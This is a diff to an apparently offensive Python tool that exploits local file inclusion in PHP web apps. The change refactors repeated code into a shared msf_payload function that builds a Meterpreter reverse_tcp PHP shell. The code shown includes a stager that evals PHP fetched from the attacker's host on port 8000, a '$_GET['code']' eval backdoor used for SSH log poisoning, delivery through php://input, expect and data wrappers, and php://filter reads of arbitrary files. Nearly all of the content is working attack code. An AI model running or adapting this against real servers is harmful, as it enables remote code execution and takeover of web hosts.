@@ -18,6 +18,41 @@ t = Terminal()
 
 stager_payload = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
 
+
+def msf_payload():
+
+         # Arguments needed for Meterpreter
+        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
+        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
+
+        # Generate random shell name
+        g = Generator()
+        shell = g.generate()
+
+        print(t.green(" [*] ") + "Generating Data Wrapper")
+        progressbar()
+        print(t.red(" [!] ") + "Success!")
+        print(t.green(" [*] ") + "Generating Metasploit Payload")
+        progressbar()
+
+        # msfpayload arguments
+        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
+
+        # Generate shell
+
+        try:
+            msf = subprocess.Popen(php, shell=True)
+            msf.wait()
+        except msf.returncode as msf_error:
+            if msf_error != 0:
+                print(t.red(" [!] ") + "Error Generating MSF Payload ")
+            else:
+                print(t.red(" [!] ") + "Success! ")
+                print(t.red(" [!] ") + "Payload Is Located At: /tmp/{0}.php").format(shell)
+
+        return lhost, lport, shell
+
+
 def progressbar():
 
     bar_width = 70
@@ -42,34 +77,7 @@ class Data:
 
     def execute_data(self):
 
-            # Arguments needed for Meterpreter
-            lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
-            lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
-
-            # Generate random shell name
-            g = Generator()
-            shell = g.generate()
-
-            print(t.green(" [*] ") + "Generating Data Wrapper")
-            progressbar()
-            print(t.red(" [!] ") + "Success!")
-            print(t.green(" [*] ") + "Generating Metasploit Payload")
-            progressbar()
-
-            # msfpayload arguments
-            php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
-
-            # Generate shell
-            msf = subprocess.Popen(php, shell=True)
-            msf.wait()
-
-            # Make sure payload was generated correctly
-            if msf.returncode != 0:
-                print(t.red(" [!] ") + "Error Generating MSF Payload ")
-            else:
-                print(t.red(" [!] ") + "Success! ")
-
-            print(t.red(" [!] ") + "Payload Is Located At: /tmp/{0}.php").format(shell)
+            lhost, lport, shell = msf_payload()
 
             # Build payload
             if self.nostager:
@@ -78,6 +86,8 @@ class Data:
                 payload_file.close()
             else:
                 payload = stager_payload.format(lhost, shell)
+                print(payload)
+
             encoded_payload = quote_plus(payload.encode('base64'))
 
             # Build data wrapper
@@ -118,52 +128,25 @@ class Input:
 
     def execute_input(self):
 
-        # Arguments needed for Meterpreter
-        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
-        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
+        lhost, lport, shell = msf_payload()
 
-        # Generate random shell name
-        g = Generator()
-        shell = g.generate()
-
-
-        print(t.green(" [*] ") + "Generating Data Wrapper")
-        progressbar()
-        print(t.red(" [!] ") + "Success!")
-        print t.green(" [*] ") + "Generating Metasploit Payload"
-        progressbar()
-
-        # Generate PHP shell
-        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
-        msf = subprocess.Popen(php, shell=True)
-        msf.wait()
-
-        # Handle Metasploit error codes
-        if msf.returncode != 0:
-
-            print(t.red(" [!] Error Generating MSF Payload "))
-
-        else:
-
-            print(t.green(" [*] ") + "Success!")
-            print(t.red(" [!] ") + "Payload Is Located At: " + t.red("/tmp/{0}.php")).format(shell)
- 
         # Build php payload
         wrapper = "php://input"
         url = self.target + wrapper
+
         if self.nostager:
-            payload_file = open("/tmp/{0}.php".format(shell),"r")
+            payload_file = open("/tmp/{0}.php".format(shell), "r")
             payload = payload_file.read()
             payload_file.close()
         else:
-            payload = stager_payload.format(lhost,shell)
+            payload = stager_payload.format(lhost, shell)
 
         handle = Payload(lhost, lport, self.target, shell)
         handle.handler()
 
         if self.nostager:
             progressbar()
-        else: 
+        else:
             # Assuming if there is a server running on port 8000 hosting from /tmp
             print(t.red(" [!] ") + "Is Your Server Running?")
             print(t.yellow(" [*] ") + "To Launch Server: http-server /tmp -p 8000")
@@ -190,30 +173,7 @@ class Expect:
 
     def execute_expect(self):
 
-        # Arguments for Meterpreter
-        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
-        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
-
-        # Generate random shell name
-        g = Generator()
-        shell = g.generate()
-
-        print(t.green(" [*] ") + "Generating Payload")
-        progressbar()
-        print(t.red(" [!] ") + "Success!")
-        print(t.green(" [*] ") + "Generating Metasploit Payload")
-        progressbar()
-
-        # Generate PHP shell
-        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
-        msf = subprocess.Popen(php, shell=True)
-        msf.wait()
-
-        # Handle Metasploit error codes
-        if msf.returncode != 0:
-            print(t.red(" [!] Error Generating MSF Payload "))
-        else:
-            print(t.green(" [*] ") + "Success!")
+        lhost, lport, shell = msf_payload()
 
         handle = Payload(lhost, lport, self.target, shell)
         handle.handler()
@@ -254,30 +214,7 @@ class Logs:
 
     def execute_logs(self):
 
-        # Arguments for Meterpreter
-        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
-        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
-
-        # Generate random shell name
-        g = Generator()
-        shell = g.generate()
-
-        print(t.green(" [*] ") + "Generating Payload")
-        progressbar()
-        print(t.red(" [!] ") + "Success!")
-        print(t.green(" [*] ") + "Generating Metasploit Payload")
-        progressbar()
-
-        # Generate PHP shell
-        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
-        msf = subprocess.Popen(php, shell=True)
-        msf.wait()
-
-        # Handle Metasploit error codes
-        if msf.returncode != 0:
-            print(t.red(" [!] Error Generating MSF Payload "))
-        else:
-            print(t.green(" [*] ") + "Success!")
+        lhost, lport, shell = msf_payload()
 
         handle = Payload(lhost, lport, self.target, shell)
         handle.handler()
@@ -317,36 +254,14 @@ class SSHLogs:
 
     def execute_ssh(self):
 
-        # Arguments for Meterpreter
-        lhost = raw_input(t.green(" [*] ") + "Please Enter Host For Callbacks: ")
-        lport = raw_input(t.green(" [*] ") + "Please Enter Port For Callbacks: ")
-
-        # Generate random shell name
-        g = Generator()
-        shell = g.generate()
-
-        print(t.green(" [*] ") + "Generating Payload")
-        progressbar()
-        print(t.red(" [!] ") + "Success!")
-        print(t.green(" [*] ") + "Generating Metasploit Payload")
-        progressbar()
-
-        # Generate PHP shell
-        php = "/usr/local/share/metasploit-framework/msfpayload php/meterpreter/reverse_tcp LHOST={0} LPORT={1} R > /tmp/{2}.php".format(lhost, lport, shell)
-        msf = subprocess.Popen(php, shell=True)
-        msf.wait()
-
-        # Handle Metasploit error codes
-        if msf.returncode != 0:
-            print(t.red(" [!] Error Generating MSF Payload "))
-        else:
-            print(t.green(" [*] ") + "Success!")
+        lhost, lport, shell = msf_payload()
 
         handle = Payload(lhost, lport, self.target, shell)
         handle.handler()
 
         payload_file = open('/tmp/{0}.php'.format(shell),'r')
-	payload_stage2 = quote_plus(payload_file.read())
+
+        payload_stage2 = quote_plus(payload_file.read())
         payload_file.close()
         payload = "<?php eval(\\$_GET['code'])?>"
         print(t.blue(" [!] ") + "Enter fake passwords to perform SSH log poisoning...")
@@ -357,7 +272,7 @@ class SSHLogs:
         print(t.green(" [*] ") + "Downloading Shell")
         progressbar()
         lfi = self.target + self.location + '&code={0}'.format(payload_stage2)
-        
+
         try:
             r = requests.get(lfi)  # pull down shell from poisoned logs
             if r.status_code != 200:
@@ -374,8 +289,8 @@ class Filter:
 
     def execute_filter(self):
 
-        ffile = raw_input(t.green(" [*] ") + "Please Enter File To Read: ")   # filter file
-        payload = "php://filter/convert.base64-encode/resource={0}".format(ffile)
+        f_file = raw_input(t.green(" [*] ") + "Please Enter File To Read: ")   # filter file
+        payload = "php://filter/convert.base64-encode/resource={0}".format(f_file)
         lfi = self.target + payload
 
         try:
